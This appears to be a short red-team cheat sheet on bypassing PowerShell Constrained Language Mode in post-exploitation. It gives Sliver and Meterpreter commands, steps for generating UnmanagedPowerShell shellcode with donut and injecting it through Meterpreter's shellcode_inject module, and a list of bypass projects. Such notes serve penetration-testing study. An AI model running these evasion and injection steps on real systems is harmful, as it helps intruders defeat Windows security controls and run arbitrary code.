# CLM bypass
Both Sliver and Meterpreter have built in CLM bypass modules

### Sliver:

`sharpsh -- -c $ExecutionContext.SessionState.LanguageMode`
![SliverCLM](../images/SliverCLM.png?raw=true "Sliver CLM bypass")



### Meterpreter:
```powershell
meterpreter > load powershell
meterpreter > powershell_execute $ExecutionContext.SessionState.LanguageMode
[+] Command execution completed:
FullLanguage
```


### UnmanagedPowerShell
https://github.com/mmnoureldin/UnmanagedPowerShell

load powershell may not work if AV is still on. UnmanagedPowershell should work. AND it has built in PowerView, PowerUp, PowerUpSQL, and Powermad. 

Use donut as shown in the video from the repo to generate the shellcode.

In meterpreter:
```
bg
use post/windows/manage/shellcode_inject

set CHANNELIZED true
set INTERACTIVE true
set session X
set shellcode /home/kali/tools/Windows/UnmanagedPS.bin

run
```
![Unmanaged Powershell](../images/UnmanagedPS.png?raw=true "Unmanaged Powershell")

###
Other projects to check out

https://github.com/beauknowstech/FullBypass

https://github.com/calebstewart/bypass-clm

https://github.com/n3rada/powerspace

https://github.com/padovah4ck/PSByPassCLM